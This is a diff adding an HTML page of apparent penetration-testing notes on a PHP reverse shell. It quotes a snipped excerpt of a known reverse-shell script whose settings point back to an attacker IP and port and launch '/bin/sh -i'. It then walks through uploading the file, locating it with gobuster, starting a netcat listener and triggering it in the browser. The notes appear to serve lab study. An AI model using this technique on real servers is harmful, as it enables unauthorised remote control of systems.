@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>PHP Reverse Shell</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>PHP Reverse Shell</h1><br/><p>It is possible to find webshells under the folder /usr/share/webshells/ , however, if you</p><p>don&#39;t have it, you can download it from below:</p><p></p><p><a href="https://github.com/BlackArch/webshells">https://github.com/BlackArch/webshells</a></p><p></p><p></p><p>For this exercise we are going to use the /usr/share/webshells/php/php-reverse-shell.php.</p><p></p><p></p><p>&lt;?php</p><p>// php-reverse-shell - A Reverse Shell implementation in PHP</p><p>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</p><p>//</p><p>// This tool may be used for legal purposes only.</p><p>// for any actions performed using this tool.</p><p>// for damage caused by this tool.</p><p>Users take full responsibility</p><p>The author accepts no liability</p><p>If these terms are not acceptable to you, then</p><p>// do not use this tool.</p><p>//</p><p>&lt;SNIP&gt;</p><p>set_time_limit (0);</p><p>$VERSION = &quot;1.0&quot;;</p><p>$ip = &#39;127.0.0.1&#39;; // CHANGE THIS WITH YOUR IP {ATTACKER_IP}</p><p>$port = 1234; // CHANGE THIS WITH YOUR LISTENING PORT {ATTACKER_PORT}</p><p>$chunk_size = 1400;</p><p>$write_a = null;</p><p>$error_a = null;</p><p>$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;</p><p>$daemon = 0;</p><p>$debug = 0;</p><p>&lt;SNIP&gt;</p><p>?&gt;</p><p></p><p>Of course we need to modify the above code so it can suit our needs. We are going to change the <strong>$ip</strong> and</p><p>the <strong>$port</strong> variables to match our settings and then we will attempt to upload the file.</p><p></p><p>1. Find a way to upload the php file and run it as below:</p><p>2. Finding upload location is done using gobuster with -x flag for php files.</p><p></p><p>Run netcat listener in Attacker machine.</p><p></p><p>Then in the web browser run the php file using the path found.</p><p>http://{TARGET_IP}/uploads/php-reverse-shell.php</p></div>
+</body>
+</html>
